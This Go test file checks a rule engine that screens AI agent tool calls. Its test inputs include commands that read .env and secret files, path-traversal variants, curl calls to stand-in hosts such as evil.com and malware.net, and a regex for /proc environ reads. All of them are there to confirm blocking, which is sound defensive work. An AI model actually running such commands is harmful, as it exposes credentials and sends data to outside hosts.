package rules

import (
	"encoding/json"
	"strings"
	"testing"
)

// Helper to create a ToolCall with JSON arguments
func makeToolCall(name string, args map[string]interface{}) ToolCall {
	argsJSON, _ := json.Marshal(args)
	return ToolCall{
		Name:      name,
		Arguments: argsJSON,
	}
}

func TestEngine_BasicPathMatching(t *testing.T) {
	// Create a rule that blocks reading .env files
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/.env", "**/.env.*"},
			},
			Message:  "BLOCKED: Access to .env files is not allowed",
			Severity: "critical",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: cat .env should be blocked
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "cat .env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat .env to be blocked, but it wasn't")
	}
	if result.RuleName != "block-env-files" {
		t.Errorf("Expected rule name 'block-env-files', got '%s'", result.RuleName)
	}
	if result.Action != ActionBlock {
		t.Errorf("Expected action 'block', got '%s'", result.Action)
	}

	// Test: cat README.md should NOT be blocked
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat README.md",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected cat README.md to be allowed, but it was blocked")
	}
}

func TestEngine_VariableExpansion(t *testing.T) {
	// Create a rule that blocks reading files in home directory secrets
	rules := []Rule{
		{
			Name:    "block-home-secrets",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"/home/testuser/.env", "/home/testuser/.secrets/**"},
			},
			Message: "BLOCKED: Access to home directory secrets",
		},
	}

	// Create engine with a controlled normalizer
	normalizer := NewNormalizerWithEnv("/home/testuser", "/home/testuser/project", map[string]string{
		"HOME": "/home/testuser",
	})

	engine, err := NewTestEngineWithNormalizer(rules, normalizer)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: cat $HOME/.env should be blocked (variable expansion)
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "cat $HOME/.env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat $HOME/.env to be blocked, but it wasn't")
	}

	// Test: cat ${HOME}/.env should also be blocked (braced variable)
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat ${HOME}/.env",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat ${HOME}/.env to be blocked, but it wasn't")
	}

	// Test: cat ~/.env should be blocked (tilde expansion)
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat ~/.env",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat ~/.env to be blocked, but it wasn't")
	}
}

func TestEngine_PathTraversal(t *testing.T) {
	// Create a rule that blocks reading .env in the user's home
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"/home/testuser/.env"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	// Create engine with a controlled normalizer
	normalizer := NewNormalizerWithEnv("/home/testuser", "/tmp", map[string]string{})

	engine, err := NewTestEngineWithNormalizer(rules, normalizer)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: path traversal attack should be normalized and blocked
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "cat /tmp/../home/testuser/.env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected path traversal attack to be blocked, but it wasn't")
	}

	// Test: another path traversal variant
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat /var/log/../../home/testuser/.env",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected path traversal attack to be blocked, but it wasn't")
	}
}

func TestEngine_Exceptions(t *testing.T) {
	// Create a rule that blocks .env files but allows .env.example
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths:  []string{"**/.env", "**/.env.*"},
				Except: []string{"**/.env.example", "**/.env.sample"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: .env should be blocked
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "cat .env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected .env to be blocked, but it wasn't")
	}

	// Test: .env.local should be blocked
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat .env.local",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected .env.local to be blocked, but it wasn't")
	}

	// Test: .env.example should be ALLOWED (exception)
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat .env.example",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected .env.example to be allowed, but it was blocked")
	}

	// Test: .env.sample should be ALLOWED (exception)
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat .env.sample",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected .env.sample to be allowed, but it was blocked")
	}
}

func TestEngine_NetworkHostMatching(t *testing.T) {
	// Create a rule that blocks network access to certain hosts
	rules := []Rule{
		{
			Name:    "block-malicious-hosts",
			Actions: []Operation{OpNetwork},
			Block: Block{
				Hosts: []string{"evil.com", "*.malware.net", "192.168.1.*"},
			},
			Message: "BLOCKED: Network access to blocked host",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: curl to evil.com should be blocked
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "curl https://evil.com/data",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected curl to evil.com to be blocked, but it wasn't")
	}

	// Test: curl to subdomain.malware.net should be blocked (wildcard)
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "curl http://subdomain.malware.net/payload",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected curl to subdomain.malware.net to be blocked, but it wasn't")
	}

	// Test: curl to safe.example.com should be ALLOWED
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "curl https://safe.example.com/api",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected curl to safe.example.com to be allowed, but it was blocked")
	}
}

func TestEngine_DisabledRules(t *testing.T) {
	// Create a disabled rule
	enabled := true
	disabled := false
	rules := []Rule{
		{
			Name:    "enabled-rule",
			Enabled: &enabled,
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/enabled.txt"},
			},
			Message: "BLOCKED: enabled.txt",
		},
		{
			Name:    "disabled-rule",
			Enabled: &disabled,
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/disabled.txt"},
			},
			Message: "BLOCKED: disabled.txt",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Verify only enabled rule is loaded
	if len(engine.GetCompiledRules()) != 1 {
		t.Fatalf("Expected 1 rule (disabled rule should be skipped), got %d", len(engine.GetCompiledRules()))
	}

	// Test: enabled.txt should be blocked
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "cat enabled.txt",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected enabled.txt to be blocked, but it wasn't")
	}

	// Test: disabled.txt should NOT be blocked (rule is disabled)
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "cat disabled.txt",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected disabled.txt to be allowed (rule disabled), but it was blocked")
	}
}

func TestEngine_MultipleActions(t *testing.T) {
	// Create a rule that blocks both read and write to sensitive paths
	rules := []Rule{
		{
			Name:    "protect-secrets",
			Actions: []Operation{OpRead, OpWrite, OpDelete},
			Block: Block{
				Paths: []string{"**/secrets/**", "**/.ssh/**"},
			},
			Message: "BLOCKED: Access to secrets directory",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: reading from secrets should be blocked
	call := makeToolCall("Bash", map[string]interface{}{
		"command": "cat secrets/api_key.txt",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected reading secrets to be blocked, but it wasn't")
	}

	// Test: writing to secrets should be blocked
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "echo 'data' > secrets/data.txt",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected writing to secrets to be blocked, but it wasn't")
	}

	// Test: deleting from secrets should be blocked
	call = makeToolCall("Bash", map[string]interface{}{
		"command": "rm secrets/old_key.txt",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected deleting from secrets to be blocked, but it wasn't")
	}
}

func TestEngine_ReadWriteTools(t *testing.T) {
	// Create a rule that blocks access to .env files
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead, OpWrite},
			Block: Block{
				Paths: []string{"**/.env", "**/.env.*"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: Read tool should be blocked
	call := makeToolCall("Read", map[string]interface{}{
		"file_path": "/home/user/project/.env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected Read tool to be blocked for .env, but it wasn't")
	}

	// Test: Write tool should be blocked
	call = makeToolCall("Write", map[string]interface{}{
		"file_path": "/home/user/project/.env",
		"content":   "SECRET=value",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected Write tool to be blocked for .env, but it wasn't")
	}

	// Test: Edit tool should be blocked (it's a write operation)
	call = makeToolCall("Edit", map[string]interface{}{
		"file_path":  "/home/user/project/.env.local",
		"old_string": "OLD",
		"new_string": "NEW",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected Edit tool to be blocked for .env.local, but it wasn't")
	}
}

func TestEngine_EvaluateJSON(t *testing.T) {
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/.env"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test EvaluateJSON convenience method
	result := engine.EvaluateJSON("Bash", `{"command": "cat .env"}`)

	if !result.Matched {
		t.Errorf("Expected EvaluateJSON to block cat .env, but it didn't")
	}
	if result.RuleName != "block-env-files" {
		t.Errorf("Expected rule name 'block-env-files', got '%s'", result.RuleName)
	}
}

func TestEngine_RegexPatternLengthLimit(t *testing.T) {
	longPattern := "re:" + strings.Repeat("a", 5000)

	testRules := []Rule{
		{
			Name:    "long-regex",
			Actions: []Operation{OpRead},
			Match:   &Match{Path: longPattern},
			Message: "blocked",
		},
	}

	// Pattern is now validated at compile time — engine creation must fail
	_, err := NewTestEngine(testRules)
	if err == nil {
		t.Fatal("Expected error for regex pattern exceeding length limit, got nil")
	}
	if !strings.Contains(err.Error(), "regex pattern too long") {
		t.Errorf("Expected 'regex pattern too long' error, got: %v", err)
	}
}

func TestEngine_RegexValid(t *testing.T) {
	testRules := []Rule{
		{
			Name:    "regex-rule",
			Actions: []Operation{OpRead},
			Match:   &Match{Path: `re:/proc/(\d+|self)/(environ|cmdline)`},
			Message: "blocked",
		},
	}

	engine, err := NewTestEngine(testRules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	call := makeToolCall("Read", map[string]interface{}{
		"file_path": "/proc/1234/environ",
	})
	result := engine.Evaluate(call)
	if !result.Matched {
		t.Error("expected regex match for /proc/1234/environ")
	}
}

func TestEngine_RegexCompileError(t *testing.T) {
	testRules := []Rule{
		{
			Name:    "bad-regex",
			Actions: []Operation{OpRead},
			Match:   &Match{Path: `re:[invalid`},
			Message: "blocked",
		},
	}

	// Invalid regex is now caught at compile time — engine creation must fail
	_, err := NewTestEngine(testRules)
	if err == nil {
		t.Fatal("Expected error for invalid regex pattern, got nil")
	}
	if !strings.Contains(err.Error(), "match.path regex") {
		t.Errorf("Expected 'match.path regex' error, got: %v", err)
	}
}

func TestCompileRegex(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		wantErr bool
	}{
		{"valid short", `\d+`, false},
		{"valid complex", `^/proc/(\d+|self)/(environ|cmdline)$`, false},
		{"empty", "", false},
		{"too long", strings.Repeat("a", maxRegexLen+1), true},
		{"at limit", strings.Repeat("a", maxRegexLen), false},
		{"invalid syntax", `[unclosed`, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := compileRegex(tt.pattern)
			if (err != nil) != tt.wantErr {
				t.Errorf("compileRegex(%q) error = %v, wantErr %v", tt.pattern, err, tt.wantErr)
			}
		})
	}
}
